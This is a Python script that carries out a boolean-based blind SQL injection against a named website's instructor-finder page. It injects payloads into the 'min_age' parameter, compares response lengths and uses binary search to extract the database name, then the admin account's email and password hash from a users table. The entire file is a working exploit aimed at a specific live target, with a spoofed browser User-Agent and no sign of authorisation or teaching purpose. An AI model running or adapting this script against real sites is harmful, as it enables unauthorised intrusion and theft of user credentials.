import requests

TARGET = "https://web.kelasdata.co.id/instructor-finder"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def dump_data():
    print(f"[*] Target: {TARGET}")
    
    # 1. Calibrate precisely
    print("[*] Calibrating...")
    r_true = requests.get(TARGET, params={"min_age": "1 AND 1=1"}, headers=HEADERS, timeout=15)
    len_true = len(r_true.text)
    
    r_false = requests.get(TARGET, params={"min_age": "1 AND 1=2"}, headers=HEADERS, timeout=15)
    len_false = len(r_false.text)
    
    threshold = (len_true + len_false) // 2
    print(f"    TRUE: {len_true}, FALSE: {len_false}, Threshold: {threshold}")

    def is_true(payload):
        try:
            r = requests.get(TARGET, params={"min_age": payload}, headers=HEADERS, timeout=15)
            return len(r.text) > threshold
        except:
            return False

    # 2. Extract DB Name
    print("\n[*] Extracting DB Name...")
    db_name = ""
    for i in range(1, 64):
        low = 32
        high = 126
        found_char = False
        while low <= high:
            mid = (low + high) // 2
            payload = f"1 AND (ascii(substr(database(),{i},1)) > {mid})"
            if is_true(payload):
                low = mid + 1
                found_char = True
            else:
                high = mid - 1
        
        if not found_char or low == 32:
            break
        db_name += chr(low)
        print(f"    DB: {db_name}", end="\r")
    print(f"\n    [+] Database: {db_name}")

    # 3. Extract Admin Email (Assuming users table exists and id=1 is admin)
    print("\n[*] Extracting Admin Email (id=1)...")
    email = ""
    for i in range(1, 64):
        low = 32
        high = 126
        found_char = False
        while low <= high:
            mid = (low + high) // 2
            payload = f"1 AND (ascii(substr((select email from users where id=1),{i},1)) > {mid})"
            if is_true(payload):
                low = mid + 1
                found_char = True
            else:
                high = mid - 1
        if not found_char or low == 32: break
        email += chr(low)
        print(f"    Email: {email}", end="\r")
    print(f"\n    [+] Admin Email: {email}")

    # 4. Extract Password Hash
    print("\n[*] Extracting Password Hash...")
    pwd_hash = ""
    for i in range(1, 64):
        low = 32
        high = 126
        found_char = False
        while low <= high:
            mid = (low + high) // 2
            payload = f"1 AND (ascii(substr((select password from users where id=1),{i},1)) > {mid})"
            if is_true(payload):
                low = mid + 1
                found_char = True
            else:
                high = mid - 1
        if not found_char or low == 32: break
        pwd_hash += chr(low)
        print(f"    Hash: {pwd_hash}", end="\r")
    print(f"\n    [+] Password Hash: {pwd_hash}")

if __name__ == "__main__":
    dump_data()
